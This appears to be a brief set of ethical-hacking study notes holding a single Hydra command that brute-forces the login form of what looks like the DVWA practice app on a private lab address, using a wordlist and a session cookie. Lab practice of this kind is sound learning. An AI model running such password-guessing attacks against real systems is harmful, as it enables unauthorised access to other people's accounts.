# EH-Notes

## Brute Force
### Hydra
#### HTTP Attacks

`hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://192.168.57.132/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=nmsv6agfptj92d452si2psclc2; security=low:F=Username and/or password incorrect'`
